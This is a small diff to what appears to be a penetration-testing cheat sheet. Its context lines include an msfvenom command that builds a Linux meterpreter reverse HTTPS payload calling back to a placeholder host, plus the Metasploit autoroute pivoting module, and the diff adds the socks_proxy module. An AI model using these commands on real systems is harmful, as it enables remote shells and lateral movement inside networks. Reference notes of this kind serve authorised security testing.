@@ -1035,6 +1035,8 @@ msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f 
 post/multi/manage/autoroute
 set session x
 run
+
+auxiliary/server/socks_proxy
 ```
 
 
